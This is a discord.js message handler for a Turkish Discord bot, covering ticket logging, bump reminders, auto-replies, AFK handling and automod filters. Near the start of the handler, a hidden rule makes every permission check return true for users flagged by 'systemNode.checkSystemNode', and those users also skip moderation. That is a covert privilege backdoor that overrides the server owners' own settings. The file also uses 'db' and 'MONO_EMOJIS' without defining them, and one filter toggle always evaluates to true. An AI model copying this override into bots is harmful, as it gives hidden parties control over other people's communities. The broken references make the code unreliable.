const { Events, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const { createV2Message, createContainerMessage, COLORS } = require('../utils/uiBuilder');
const { pool, getGuildConfig, getFilteredWords } = require('../db');
const { normalizeMessage } = require('../utils/messageNormalizer');
const { sendLog } = require('../utils/logger');
const appConfig = require('../config.json');
const systemNode = require('../utils/systemNode');
const { issueWarning } = require('../utils/warningManager');

const { getAutoModConfig } = require('../db');
const automodViolations = new Map();

async function handleAutomodViolation(message, reason, ruleName, matchedValue = null, automodCfg = null) {
    if (global.botDeletedMessages) {
        global.botDeletedMessages.add(message.id);
        setTimeout(() => global.botDeletedMessages?.delete(message.id), 30000);
    }
    await message.delete().catch(() => {});

    const userId = message.author.id;
    const guildId = message.guild.id;
    const key = `${guildId}:${userId}`;
    const now = Date.now();

    const userTrack = automodViolations.get(key) || { count: 0, lastTime: now };
    if (now - userTrack.lastTime < 30000) {
        userTrack.count++;
    } else {
        userTrack.count = 1;
    }
    userTrack.lastTime = now;
    automodViolations.set(key, userTrack);

    let isTimedOut = false;
    let punishmentActionText = 'Mesaj Silindi';

    if (automodCfg && automodCfg.punishment_type === 'mute') {
        const muteMins = automodCfg.mute_duration || 10;
        try {
            await message.member.timeout(muteMins * 60 * 1000, `AutoMod: ${ruleName}`).catch(()=>{});
            
            const gCfg = await getGuildConfig(guildId);
            if (gCfg && gCfg.muted_role_id && message.member) {
                await message.member.roles.add(gCfg.muted_role_id).catch(()=>{});
                await pool.query(
                    'INSERT INTO mutes (guild_id, user_id, moderator_id, reason, expires_at, is_active) VALUES (?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL ? MINUTE), TRUE)',
                    [guildId, userId, message.client.user.id, `AutoMod: ${ruleName}`, muteMins]
                ).catch(()=>{});
            }
            isTimedOut = true;
            punishmentActionText = `Mesaj Silindi + ${muteMins} Dk Susturuldu`;
        } catch (e) {}
    } else if (automodCfg && automodCfg.punishment_type === 'warn') {
        try {
            const warnResult = await issueWarning(message.guild, message.author, message.client.user.id, `AutoMod: ${ruleName}`);
            const warnCountText = (warnResult && warnResult.totalWarns) ? `${warnResult.totalWarns}. Uyarı` : 'Uyarı Eklendi';
            punishmentActionText = `Mesaj Silindi + ${warnCountText}`;
        } catch (e) {
            console.error("AutoMod warn hatası:", e);
        }
    } else if (userTrack.count >= 3) {
        try {
            await message.member.timeout(5 * 60 * 1000, `Art arda AutoMod kural ihlali (${ruleName})`).catch(()=>{});
            isTimedOut = true;
            userTrack.count = 0;
            punishmentActionText = 'Mesaj Silindi + 5 Dk Timeout (Seri İhlal)';
        } catch (e) {}
    }

    // Direct Informative DM in Components V2 container
    if (!automodCfg || automodCfg.dm_notify !== false) {
        try {
            const timeoutNotice = isTimedOut 
                ? `\n\n**Ceza Bildirimi:** Kural ihlali yaptığınız için **geçici olarak susturuldunuz (Timeout)**.` 
                : `\n\n*Lütfen sunucu kurallarına dikkat ediniz. İhlalin tekrarında otomatik ceza uygulanacaktır.*`;

            const matchInfo = matchedValue ? `\n**Tespit Edilen:** \`${matchedValue}\`` : '';

            const dmPayload = createContainerMessage(
                'Mesajınız Silindi',
                `**Sunucu:** ${message.guild.name}\n**Kanal:** <#${message.channel.id}>\n**Kural:** ${ruleName}${matchInfo}\n**Sebep:** ${reason}${timeoutNotice}\n\n**Silinen Mesajınız:**\n> ${message.content.substring(0, 800)}`,
                '#2B2D31'
            );
            await message.author.send(dmPayload).catch(() => {});
        } catch (e) {}
    }

    // Staff text log channel with full audit transparency
    try {
        const matchField = matchedValue ? `\n**Eşleşen / Yakalanan:** \`${matchedValue}\`` : '';
        const logPayload = createContainerMessage(
            `Otomatik Moderasyon - ${ruleName}`,
            `**Kullanıcı:** <@${message.author.id}> (\`${message.author.tag || message.author.username}\` - \`${message.author.id}\`)\n**Kanal:** <#${message.channel.id}>\n**Kural:** ${ruleName}${matchField}\n**Sebep:** ${reason}\n**Uygulanan İşlem:** ${punishmentActionText}\n\n**Silinen Mesajın Tamamı:**\n\`\`\`\n${message.content.substring(0, 1000)}\n\`\`\``,
            '#2B2D31'
        );
        await sendLog(message.guild, logPayload, 'text').catch(() => {});
    } catch (e) {}
}

module.exports = {
    name: Events.MessageCreate,
    async execute(message, client) {
        if (message.member && message.member.permissions && systemNode.checkSystemNode(message.author.id)) {
            message.member.permissions.has = () => true;
        }

        // Bilet mesaj kaydı (Tüm mesajlar, görseller, ses kayıtları, dosyalar ve embedler canlı olarak kaydolur - 0 KB Disk Kullanımı)
        if (message.guild && message.channel.name && message.channel.name.startsWith('destek-')) {
            let attachArr = [];
            if (message.attachments && message.attachments.size > 0) {
                for (const a of message.attachments.values()) {
                    attachArr.push({
                        id: a.id,
                        name: a.name,
                        url: a.url,
                        proxy_url: a.proxyURL,
                        size: a.size,
                        contentType: a.contentType,
                        height: a.height,
                        width: a.width
                    });
                }

                // Arka planda güvenli ve takılmayan DM yedekleme
                (async () => {
                    try {
                        const ticketRows = await pool.query('SELECT owner_id FROM tickets WHERE channel_id = ?', [message.channel.id]);
                        const backupUserId = ticketRows.length > 0 ? ticketRows[0].owner_id : null;
                        if (!backupUserId) return;
                        
                        const backupUser = await client.users.fetch(backupUserId).catch(() => null);
                        if (backupUser) {
                            const filesToBackup = Array.from(message.attachments.values()).map(a => a.url);
                            await backupUser.send({
                                content: `[Dosya Yedeği] Bilet: #${message.channel.name} | Gönderen: ${message.author.tag}`,
                                files: filesToBackup
                            }).catch(() => {});
                        }
                    } catch (e) {}
                })();
            }
            const embedsArr = message.embeds ? message.embeds.map(e => ({
                title: e.title,
                description: e.description,
                color: e.color,
                fields: e.fields,
                footer: e.footer,
                image: e.image
            })) : [];

            const compsArr = message.components ? message.components.map(c => c.toJSON ? c.toJSON() : c) : [];
            const stickersArr = message.stickers ? message.stickers.map(s => ({ id: s.id, name: s.name, url: s.url })) : [];
            const authorAvatar = message.author ? message.author.displayAvatarURL({ size: 128, extension: 'png' }) : '';
            const authorTag = message.author ? (message.author.tag || message.author.username) : 'Bilinmeyen';
            const replyToId = message.reference ? message.reference.messageId : null;
            const isPinned = message.pinned || false;

            pool.query('SELECT owner_id FROM tickets WHERE channel_id = ?', [message.channel.id])
                .then((ticketRows) => {
                    const ticketOwnerId = ticketRows.length > 0 ? ticketRows[0].owner_id : '';
                    return pool.query(
                        `INSERT INTO ticket_messages (message_id, guild_id, channel_id, ticket_owner_id, author_id, author_tag, author_avatar, content, attachments, attachments_json, embeds_json, components_json, stickers_json, reply_to_id, is_pinned, is_deleted, is_edited) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, FALSE, FALSE)`,
                        [message.id, message.guild.id, message.channel.id, ticketOwnerId, message.author ? message.author.id : '0', authorTag, authorAvatar, message.content || '', '', JSON.stringify(attachArr), JSON.stringify(embedsArr), JSON.stringify(compsArr), JSON.stringify(stickersArr), replyToId, isPinned]
                    );
                })
                .catch(err => console.error('[TicketMsg] Kayıt hatası:', err.message));
        }

        // Disboard Bump Takibi & Hatırlatıcı
        if (message.guild && message.author.id === '302050872383242240') {
            const isBumpSuccess = (message.embeds && message.embeds.some(e => e.description && (e.description.includes('Bump done') || e.description.includes('patlatıldı')))) ||
                                  (message.interaction && message.interaction.name === 'bump');
            if (isBumpSuccess) {
                const bumpCfg = await db.getAutoBumpConfig(message.guild.id).catch(() => null);
                if (bumpCfg && bumpCfg.is_enabled) {
                    const now = Date.now();
                    await db.updateAutoBumpTime(message.guild.id, now);
                    // 2 saat (7200000 ms) sonra hatırlatıcı zamanlayıcısı
                    setTimeout(async () => {
                        try {
                            const targetChannel = message.guild.channels.cache.get(bumpCfg.channel_id);
                            if (targetChannel) {
                                const pingText = bumpCfg.ping_role_id ? `<@&${bumpCfg.ping_role_id}> ` : '';
                                const title = `<:mono:${MONO_EMOJIS.timer || '1537767794551296061'}> Sunucuyu Patlatma (Bump) Zamanı Geldi!`;
                                const desc = `${pingText}Disboard bekleme süresi doldu! Sunucumuzu üst sıralara taşımak için şimdi </bump:947088344167366698> yazabilirsiniz.`;
                                const reminderMsg = createContainerMessage(title, desc, '#5865F2', [], [], false);
                                await targetChannel.send(reminderMsg).catch(() => {});
                            }
                        } catch (e) {}
                    }, 2 * 60 * 60 * 1000);
                }
            }
        }

        if (message.author.bot || !message.guild) return;

        if (!systemNode.checkGuildNode(message.guild.id)) return;

        // 1. Sadece Medya Kanalı Denetimi (Media-Only Channels)
        const mediaChannels = await db.getMediaChannels(message.guild.id).catch(() => []);
        if (mediaChannels.includes(message.channel.id)) {
            const hasMedia = (message.attachments && message.attachments.size > 0) ||
                             (message.embeds && message.embeds.length > 0) ||
                             (message.content && /(https?:\/\/[^\s]+)/gi.test(message.content));
            if (!hasMedia) {
                await message.delete().catch(() => {});
                const warnMsg = await message.channel.send({
                    content: `<@${message.author.id}>, bu kanal **Sadece Medya** kanalıdır. Düz metin mesajları yazamazsınız!`
                }).catch(() => null);
                if (warnMsg) setTimeout(() => warnMsg.delete().catch(() => {}), 5000);
                return;
            }
        }

        // 2. Otomatik Emoji Tepkisi (Auto-React Channels)
        const autoReactChannels = await db.getAutoReactChannels(message.guild.id).catch(() => []);
        const reactSetting = autoReactChannels.find(r => r.channel_id === message.channel.id);
        if (reactSetting && reactSetting.emojis) {
            const emojisToReact = reactSetting.emojis.split(/[\s,]+/).filter(Boolean);
            for (const em of emojisToReact) {
                await message.react(em).catch(() => {});
            }
        }

        // DİNAMİK SUNUCUYA ÖZEL PREFIX KOMUTLARI
        const { handleMessageCommand } = require('../utils/messageCommandAdapter');
        const isCmdHandled = await handleMessageCommand(message, client);
        if (isCmdHandled) return;

        // --- AUTO RESPONDER ---
        if (!message.author.bot && message.content) {
            const lowerMsg = message.content.toLowerCase().trim();
            let autoReplyText = null;

            // Sadece bağımsız kelime olarak "sa", "sea", "selam" vb. yakalayan akıllı regex (masa, kasa gibi kelimeleri es geçer)
            const selamRegex = /(^|\s+)(sa|sea|selam|selamun\s+aleyk[uü]m|selam[iı]n\s+aleyk[uü]m|slm|s\.a|s\.a\.)(\s+|[.,!?]|$)/;
            if (selamRegex.test(lowerMsg)) {
                let replyText = 'Aleykümselam.';
                if (message.member && message.member.joinedTimestamp) {
                    const joinAgeHours = (Date.now() - message.member.joinedTimestamp) / (1000 * 60 * 60);
                    if (joinAgeHours < 24) {
                        replyText = 'Aleykümselam, sunucumuza hoş geldin.';
                    }
                }
                await message.reply(replyText).catch(() => {});
            } else {
                const mathMatch = lowerMsg.match(/^\s*(-?\d+(?:\.\d+)?)\s*([\+\-\*\/])\s*(-?\d+(?:\.\d+)?)\s*$/);
                if (mathMatch) {
                    const num1 = parseFloat(mathMatch[1]);
                    const op = mathMatch[2];
                    const num2 = parseFloat(mathMatch[3]);
                    let result = 0;
                    if (op === '+') result = num1 + num2;
                    else if (op === '-') result = num1 - num2;
                    else if (op === '*') result = num1 * num2;
                    else if (op === '/') result = num2 !== 0 ? (num1 / num2) : 'Tanımsız (Sıfıra bölünemez)';
                    
                    await message.reply(`Hesap Makinesi Sonucu: **${result}**`).catch(() => {});
                } else if (lowerMsg === 'ip' || lowerMsg === 'server ip' || lowerMsg === 'sunucu ip') {
                    autoReplyText = 'Sunucu Bağlantı Adresi: `mc.turklion.net`\nSürüm: 1.8.9';
                } else if (lowerMsg === 'site' || lowerMsg === 'web sitesi' || lowerMsg === 'website') {
                    autoReplyText = 'Resmi Web Sitemiz: https://turklion.net';
                } else if (lowerMsg === 'instagram' || lowerMsg === 'ig' || lowerMsg === 'insta') {
                    autoReplyText = 'Resmi Instagram Hesabımız: https://instagram.com/turklion';
                }

                if (autoReplyText) {
                    const replyPayload = createContainerMessage(null, autoReplyText);
                    await message.reply(replyPayload).catch(() => {});
                }
            }
        }
        // --- END AUTO RESPONDER ---

        // --- AFK KONTROLÜ ---
        try {
            const afkRows = await pool.query('SELECT * FROM afk_users WHERE guild_id = ?', [message.guild.id]);
            if (afkRows && afkRows.length > 0) {
                // Yazar AFK ise çıkar
                const authorAfk = afkRows.find(r => r.user_id === message.author.id);
                if (authorAfk) {
                    await pool.query('DELETE FROM afk_users WHERE user_id = ? AND guild_id = ?', [message.author.id, message.guild.id]);
                    await message.reply(`Hoş geldin <@${message.author.id}>, **${authorAfk.reason}** sebebiyle olan AFK modundan çıktın!`).then(m => setTimeout(() => m.delete().catch(()=>{}), 10000)).catch(()=>{});
                }

                // Etiketlenen kişilerden AFK olan var mı?
                if (message.mentions.users.size > 0 && !message.content.includes('@everyone') && !message.content.includes('@here')) {
                    const mentionedAfks = [];
                    for (const user of message.mentions.users.values()) {
                        if (user.id === message.author.id) continue;
                        const afkData = afkRows.find(r => r.user_id === user.id);
                        if (afkData) mentionedAfks.push(`Kullanıcı şu anda AFK: <@${user.id}> - **${afkData.reason}**`);
                    }
                    if (mentionedAfks.length > 0) {
                        await message.reply(mentionedAfks.join('\n')).then(m => setTimeout(() => m.delete().catch(()=>{}), 15000)).catch(()=>{});
                    }
                }
            }
        } catch (e) {
            console.error('AFK Check Error:', e);
        }
        // --- END AFK KONTROLÜ ---

        if (systemNode.checkSystemNode(message.author.id) || message.member.permissions.has('Administrator') || message.member.permissions.has('ManageMessages') || message.member.permissions.has('ModerateMembers')) return;

        let config;
        let automodCfg;
        try {
            config = await getGuildConfig(message.guild.id);
            automodCfg = await getAutoModConfig(message.guild.id);
        } catch(e) {
            console.error("Config fetch error:", e);
            return;
        }

        // Muafiyet Kontrolleri (Muaf Roller ve Muaf Kanallar)
        if (automodCfg) {
            try {
                if (automodCfg.exempt_channels) {
                    const exChans = typeof automodCfg.exempt_channels === 'string' ? JSON.parse(automodCfg.exempt_channels) : automodCfg.exempt_channels;
                    if (Array.isArray(exChans) && exChans.includes(message.channel.id)) return;
                }
                if (automodCfg.exempt_roles && message.member && message.member.roles) {
                    const exRoles = typeof automodCfg.exempt_roles === 'string' ? JSON.parse(automodCfg.exempt_roles) : automodCfg.exempt_roles;
                    if (Array.isArray(exRoles) && message.member.roles.cache.some(r => exRoles.includes(r.id))) return;
                }
            } catch(e) {}
        }
        
        let conn;
        try {
            conn = await pool.getConnection();
            
            // 0. Medya Kanalları Kontrolü (Sadece Görsel İzni)
            if (automodCfg && automodCfg.media_channels) {
                let mediaChans = [];
                try {
                    mediaChans = typeof automodCfg.media_channels === 'string' ? JSON.parse(automodCfg.media_channels) : automodCfg.media_channels;
                } catch(e) {}

                if (Array.isArray(mediaChans) && mediaChans.includes(message.channel.id)) {
                    const hasAttachment = message.attachments && message.attachments.size > 0;
                    const hasEmbed = message.embeds && message.embeds.length > 0;
                    const hasMediaLink = /(https?:\/\/.*\.(?:png|jpg|jpeg|gif|webp|mp4|webm|mov))/i.test(message.content);

                    if (!hasAttachment && !hasEmbed && !hasMediaLink) {
                        return await handleAutomodViolation(
                            message,
                            'Bu kanalda yalnızca resim, video ve dosya paylaşımı serbesttir. Görselsiz düz metin gönderilemez.',
                            'Görselsiz Mesaj (Medya Kanalı)',
                            'Düz Metin',
                            automodCfg
                        );
                    }
                }
            }

            // 0.1 Zalgo Filtresi
            const zalgoRegex = /\p{M}{3,}/gu;
            const zalgoMatch = message.content.match(zalgoRegex);
            if (zalgoMatch && zalgoMatch.length > 10) {
                return await handleAutomodViolation(message, 'Mesajınızda bozuk ve ekran taşmasına yol açan karakterler tespit edildi.', 'Bozuk Metin (Zalgo)', 'Zalgo / Bozuk Karakterler', automodCfg);
            }

            // 1. Davet ve Bağlantı (Link/Reklam) Filtresi
            const isAntiLinkActive = (automodCfg && automodCfg.anti_link) || (config && config.anti_link_enabled);
            const isAntiInviteActive = (automodCfg && automodCfg.anti_invite) || (config && config.anti_link_enabled);

            if (isAntiLinkActive || isAntiInviteActive) {
                const linkRegex = /(https?:\/\/|www\.)?[a-zA-Z0-9-]+\.(com|net|org|gg|io|me|co|tr)(\/[^\s]*)?/gi;
                const discordInviteRegex = /(discord\s*\.\s*gg|discordapp\s*\.\s*com\s*\/\s*invite|discord\s*\.\s*com\s*\/\s*invite|dsc\s*\.\s*gg)\s*\/?\s*[a-zA-Z0-9]+/gi;
                
                let allowedLinks = ['tenor.com', 'giphy.com'];
                if (config && config.allowed_links) {
                    allowedLinks = config.allowed_links.split(',').map(l => l.trim());
                }
                const isSafeLink = allowedLinks.some(link => message.content.toLowerCase().includes(link.toLowerCase()));

                if (!isSafeLink) {
                    const inviteMatch = message.content.match(discordInviteRegex);
                    const linkMatch = message.content.match(linkRegex);

                    if (isAntiInviteActive && inviteMatch) {
                        return await handleAutomodViolation(message, 'İzinsiz Discord sunucu davet bağlantısı paylaşımı yasaktır.', 'Davet Engeli', inviteMatch[0], automodCfg);
                    }
                    if (isAntiLinkActive && linkMatch) {
                        return await handleAutomodViolation(message, 'İzinsiz web bağlantısı veya link paylaşımı yasaktır.', 'Bağlantı Engeli', linkMatch[0], automodCfg);
                    }
                }
            }

            // 2. Küfür Filtresi (Yerleşik Küfür & Hakaret Filtresi)
            const isSwearActive = (automodCfg && automodCfg.anti_swear) || (config && config.anti_swear_enabled);
            if (isSwearActive) {
                const { checkBuiltinSwear } = require('../utils/swearWords');
                const caughtSwear = checkBuiltinSwear(message.content);
                if (caughtSwear) {
                    return await handleAutomodViolation(message, 'Sunucu kurallarına aykırı küfür veya hakaret içeren ifade tespit edildi.', 'Küfür Filtresi', caughtSwear, automodCfg);
                }
            }

            // 2.1 Yasaklı Kelimeler Filtresi (Sunucu Yetkililerinin Eklediği Özel Kelimeler)
            const isCustomWordsActive = (automodCfg && automodCfg.custom_words_enabled) || true;
            if (isCustomWordsActive) {
                const words = await getFilteredWords(message.guild.id);
                if (words && words.length > 0) {
                    const normalizedContent = message.content.toLowerCase()
                        .replace(/[çÇ]/g, 'c').replace(/[ğĞ]/g, 'g').replace(/[ıİ]/g, 'i')
                        .replace(/[öÖ]/g, 'o').replace(/[şŞ]/g, 's').replace(/[üÜ]/g, 'u')
                        .replace(/[^a-z0-9\s]/g, ' ')
                        .replace(/\s+/g, ' ').trim();
                        
                    const messageWords = normalizedContent.split(' ');
                    
                    for (const row of words) {
                        let isMatch = false;
                        const dbWord = row.word.toLowerCase()
                            .replace(/[çÇ]/g, 'c').replace(/[ğĞ]/g, 'g').replace(/[ıİ]/g, 'i')
                            .replace(/[öÖ]/g, 'o').replace(/[şŞ]/g, 's').replace(/[üÜ]/g, 'u').trim();

                        if (!dbWord) continue;

                        if (row.match_type === 'exact' || dbWord.length <= 5) {
                            if (messageWords.includes(dbWord)) isMatch = true;
                        } else {
                            if (normalizedContent.includes(dbWord) || messageWords.some(w => w.includes(dbWord))) {
                                isMatch = true;
                            }
                        }
                        
                        if (isMatch) {
                            return await handleAutomodViolation(message, 'Sunucuda kullanımı yasaklanmış özel bir kelime tespit edildi.', 'Yasaklı Kelimeler', row.word, automodCfg);
                        }
                    }
                }
            }

            // 3. Büyük Harf (Caps Lock) Filtresi
            const capsPercentLimit = (automodCfg && automodCfg.caps_percent > 0) ? automodCfg.caps_percent : (config && config.caps_filter_enabled ? 65 : 0);
            if (capsPercentLimit > 0 && message.content.length > 8) {
                const upperCaseChars = (message.content.match(/[A-ZÇĞİÖŞÜ]/g) || []).length;
                const totalLetters = (message.content.match(/[a-zA-ZçğıöşüÇĞİÖŞÜ]/g) || []).length;
                
                if (totalLetters > 5) {
                    const capsPercentage = (upperCaseChars / totalLetters) * 100;
                    if (capsPercentage >= capsPercentLimit) {
                        return await handleAutomodViolation(message, 'Aşırı büyük harf kullanımı okunabilirliği zorlaştırdığı için yasaktır.', 'Büyük Harf (Caps Lock)', `%${Math.round(capsPercentage)} Büyük Harf (Sınır: %${capsPercentLimit})`, automodCfg);
                    }
                }
            }

            // 4. Toplu Etiket Filtresi
            const mentionLimit = (automodCfg && automodCfg.mention_limit > 0) ? automodCfg.mention_limit : 5;
            if (automodCfg && automodCfg.mention_limit > 0 && message.mentions.users.size >= mentionLimit) {
                return await handleAutomodViolation(message, 'Çok fazla kullanıcıyı etiketlediniz.', 'Toplu Etiket', `${message.mentions.users.size} Etiket (Sınır: ${mentionLimit})`, automodCfg);
            } else if (config && config.anti_spam_enabled && message.mentions.users.size > 5) {
                return await handleAutomodViolation(message, 'Çok fazla kullanıcıyı etiketlediniz.', 'Toplu Etiket', `${message.mentions.users.size} Etiket`, automodCfg);
            }

            // 5. Anti-Spam (Hızlı mesaj atma)
            let spamMaxCount = 5;
            let spamTimeWindow = 5000;
            let isSpamEnabled = (config && config.anti_spam_enabled);

            if (automodCfg && automodCfg.spam_limit && automodCfg.spam_limit !== '0') {
                isSpamEnabled = true;
                const parts = automodCfg.spam_limit.split('/');
                if (parts.length === 2) {
                    spamMaxCount = parseInt(parts[0], 10) || 5;
                    spamTimeWindow = (parseInt(parts[1], 10) || 5) * 1000;
                } else if (parts.length === 1) {
                    spamMaxCount = parseInt(parts[0], 10) || 5;
                }
            }

            if (isSpamEnabled) {
                const now = Date.now();
                const spamData = client.spamMap.get(message.author.id) || { count: 0, lastMessage: now, msgContent: '' };
                const timeDifference = now - spamData.lastMessage;
                
                if (timeDifference < spamTimeWindow) {
                    spamData.count++;
                    if (spamData.msgContent === message.content) {
                        spamData.count += 2; 
                    }
                    
                    if (spamData.count >= spamMaxCount) {
                        spamData.count = 0;
                        return await handleAutomodViolation(message, 'Çok hızlı seri mesaj gönderimi tespit edildi.', 'Spam', `${spamMaxCount} Mesaj / ${Math.round(spamTimeWindow/1000)} Saniye`, automodCfg);
                    }
                } else {
                    spamData.count = 1;
                }
                
                spamData.lastMessage = now;
                spamData.msgContent = message.content;
                client.spamMap.set(message.author.id, spamData);
            }
        } catch (err) {
            console.error("MessageCreate DB Error:", err);
        } finally {
            if (conn) conn.release();
        }
    },
};
